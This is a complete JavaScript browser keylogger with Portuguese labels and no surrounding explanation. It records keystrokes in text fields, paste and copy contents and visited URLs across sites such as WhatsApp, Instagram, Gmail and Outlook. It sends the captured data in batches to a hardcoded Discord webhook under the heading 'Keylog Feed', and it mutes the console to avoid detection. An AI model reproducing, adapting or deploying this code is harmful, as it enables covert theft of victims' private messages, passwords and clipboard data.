(function(){
'use strict';
if(window._k){
try{if(typeof window._k.kill==='function'){window._k.kill();}}catch(e){}
delete window._k;}
const _id='1528620856354537472';
const _token='EDrEckoSN7dgJzZjj8LTeaisf_SxMjkrcy5QQMijZS3QcDFrNSEkvWPQde2-0V4EugEy';
const _endpoint='https://discordapp.com/api/webhooks/'+_id+'/'+_token;
const _batchSize=10;
const _flushInterval=8000;
const _maxFieldLength=950;
let _store=[];
let _timer=null;
let _session=localStorage.getItem('_k_session')||(Math.random().toString(36).slice(2,10)+Date.now().toString(36));
localStorage.setItem('_k_session',_session);
let _isFlushing=false;
let _buffer='';
let _isCapturing=false;
let _targetTag='';
let _targetId='';
let _targetPlatform='';
let _lastKeyTime=0;
const _noop=function(){};
const _orig={
log:console.log,
warn:console.warn,
error:console.error,
info:console.info,
debug:console.debug
};
console.log=_noop;
console.warn=_noop;
console.error=_noop;
console.info=_noop;
console.debug=_noop;
function _ts(){
return new Date().toISOString().replace('T',' ').slice(0,19);}
function _now(){
return Date.now();}
function _push(type,data){
_store.push({t:_ts(),ty:type,d:data});
if(_store.length>=_batchSize&&!_isFlushing)_flush();}
function _chunkArray(arr,size){
const result=[];
for(let i=0;i<arr.length;i+=size){
result.push(arr.slice(i,i+size));}
return result;}
function _getPlatform(){
const url=document.URL;
if(url.includes('whatsapp')||url.includes('web.whatsapp'))return'WhatsApp';
if(url.includes('habblive')||url.includes('habblet'))return'Habblive';
if(url.includes('instagram'))return'Instagram';
if(url.includes('telegram'))return'Telegram';
if(url.includes('discord'))return'Discord';
if(url.includes('facebook'))return'Facebook';
if(url.includes('twitter')||url.includes('x.com'))return'Twitter';
if(url.includes('gmail')||url.includes('mail.google'))return'Gmail';
if(url.includes('outlook')||url.includes('live.com'))return'Outlook';
if(url.includes('youtube'))return'YouTube';
return'Web';}
function _submitMessage(){
if(_buffer.trim().length>0){
_push('msg',{
txt:_buffer.trim(),
platform:_targetPlatform||_getPlatform(),
ctx:_targetTag+(_targetId?'#'+_targetId:'')
});}
_buffer='';
_isCapturing=false;
_targetTag='';
_targetId='';
_targetPlatform='';}
function _buildEmbed(events){
const groups={msg:[],copy:[],paste:[],nav:[]};
events.forEach(function(e){if(groups[e.ty])groups[e.ty].push(e);});
const fields=[];
function formatMsg(e){
const ts=e.t||'--:--:--';
const platform=e.d.platform||'Web';
const txt=(e.d.txt||'').slice(0,200);
return'['+ts+'] ['+platform+'] '+txt;}
function addGroup(name,items,formatter){
if(!items.length)return;
const chunks=_chunkArray(items,8);
chunks.forEach(function(chunk,idx){
const header=idx===0?'📌 '+name+' ('+items.length+') • '+_ts():'⋯ continua ('+(idx+1)+'/'+chunks.length+')';
const lines=chunk.map(formatter);
let value=lines.join('\n');
if(idx===chunks.length-1){
value+='\n──────────────────';}else{
value+='\n───────────────';}
if(value.length>_maxFieldLength){
value=value.slice(0,_maxFieldLength)+'…\n──────────────────';}
fields.push({
name:header,
value:'```\n'+value+'\n```',
inline:false
});});}
addGroup('💬 Mensagens',groups.msg,formatMsg);
addGroup('📋 Cópias',groups.copy,function(e){return'📋 '+(e.d.txt||'').slice(0,150);});
addGroup('📥 Colagens',groups.paste,function(e){return'📥 '+(e.d.txt||'').slice(0,150);});
addGroup('🧭 Navegação',groups.nav,function(e){
const title=(e.d.title||'Unknown').slice(0,40);
const url=(e.d.url||'').replace(/^https?:\/\//,'').slice(0,35);
return'🔗 '+title+' ('+url+')';
});
const total=events.length;
const summary='📊 '+total+' eventos • 💬 '+groups.msg.length+' 📋 '+groups.copy.length+' 📥 '+groups.paste.length+' 🧭 '+groups.nav.length;
return{
embeds:[{
color:0x2b2d31,
title:'📡 Keylog Feed',
description:summary,
fields:fields.slice(0,25),
footer:{text:'Session '+_session+' • '+_ts()},
timestamp:new Date().toISOString()
}]
};}
function _send(events){
if(!events||!events.length)return;
if(_isFlushing)return;
_isFlushing=true;
try{
const payload=_buildEmbed(events);
fetch(_endpoint,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify(payload),
keepalive:true
}).catch(_noop).finally(function(){
_isFlushing=false;
});
}catch(_){
_isFlushing=false;
}}
function _flush(){
if(!_store.length)return;
_send(_store.splice(0,_store.length));}
function _handleKeyDown(e){
const key=e.key;
const target=e.target;
if(!target||(target.tagName!=='INPUT'&&target.tagName!=='TEXTAREA'&&!target.isContentEditable)){
return;}
if(key==='Enter'&&!e.shiftKey){
e.preventDefault();
_submitMessage();
return;}
if(key==='Escape'){
_buffer='';
_isCapturing=false;
_targetTag='';
_targetId='';
_targetPlatform='';
return;}
if(key==='Backspace'){
if(_isCapturing){
_buffer=_buffer.slice(0,-1);}
return;}
if(key.length===1&&!e.ctrlKey&&!e.metaKey&&!e.altKey){
if(!_isCapturing){
_isCapturing=true;
_targetTag=target.tagName;
_targetId=target.id||'';
_targetPlatform=_getPlatform();
_buffer='';}
_buffer+=key;
_lastKeyTime=_now();
return;}
if(key.length===1&&key.match(/[\u00A0-\uFFFF]/)){
if(!_isCapturing){
_isCapturing=true;
_targetTag=target.tagName;
_targetId=target.id||'';
_targetPlatform=_getPlatform();
_buffer='';}
_buffer+=key;
_lastKeyTime=_now();
return;}}
function _handleFocusOut(e){
const target=e.target;
if(target&&(target.tagName==='INPUT'||target.tagName==='TEXTAREA'||target.isContentEditable)){
if(_isCapturing&&_buffer.trim().length>3){
_submitMessage();}else{
_buffer='';
_isCapturing=false;
_targetTag='';
_targetId='';
_targetPlatform='';}}}
function _handlePaste(e){
const target=e.target;
if(!target||(target.tagName!=='INPUT'&&target.tagName!=='TEXTAREA'&&!target.isContentEditable)){
return;}
const txt=e.clipboardData&&e.clipboardData.getData('text/plain');
if(!txt)return;
if(!_isCapturing){
_isCapturing=true;
_targetTag=target.tagName;
_targetId=target.id||'';
_targetPlatform=_getPlatform();
_buffer='';}
_buffer+=txt;
_push('paste',{txt:txt.slice(0,500),len:txt.length});}
function _trackCopy(e){
const txt=window.getSelection().toString().trim();
if(txt&&txt.length>0){
_push('copy',{txt:txt.slice(0,500),len:txt.length});}}
function _heartbeat(){
_push('heartbeat',{online:true,url:document.URL});}
function _init(){
document.addEventListener('keydown',_handleKeyDown,true);
document.addEventListener('focusout',_handleFocusOut,true);
document.addEventListener('paste',_handlePaste,true);
document.addEventListener('copy',_trackCopy,true);
_timer=setInterval(_flush,_flushInterval);
setInterval(_heartbeat,300000);
window.addEventListener('beforeunload',function(){
_flush();
});
setInterval(function(){
if(_isCapturing&&_buffer.length>0&&(_now()-_lastKeyTime)>30000){
_submitMessage();}
},10000);
window._logs={
kill:function(){
clearInterval(_timer);
_timer=null;
_flush();
document.removeEventListener('keydown',_handleKeyDown,true);
document.removeEventListener('focusout',_handleFocusOut,true);
document.removeEventListener('paste',_handlePaste,true);
document.removeEventListener('copy',_trackCopy,true);
localStorage.removeItem('_k_session');
console.log=_orig.log;
console.warn=_orig.warn;
console.error=_orig.error;
console.info=_orig.info;
console.debug=_orig.debug;
delete window._k;
},
flush:_flush
};}
if(document.readyState==='complete'||document.readyState==='interactive'){
setTimeout(_init,0);}else{
document.addEventListener('DOMContentLoaded',function(){setTimeout(_init,0);});}
setTimeout(function(){
if(!window._logs)_init();},3000);
window._k={
kill:function(){
if(window._logs&&typeof window._logs.kill==='function'){
window._logs.kill();}else{
if(_timer){clearInterval(_timer);_timer=null;}
document.removeEventListener('keydown',_handleKeyDown,true);
document.removeEventListener('focusout',_handleFocusOut,true);
document.removeEventListener('paste',_handlePaste,true);
document.removeEventListener('copy',_trackCopy,true);
localStorage.removeItem('_k_session');
delete window._k;}},
flush:function(){
if(window._logs&&typeof window._logs.flush==='function'){
window._logs.flush();}else{
_flush();}}
};
})();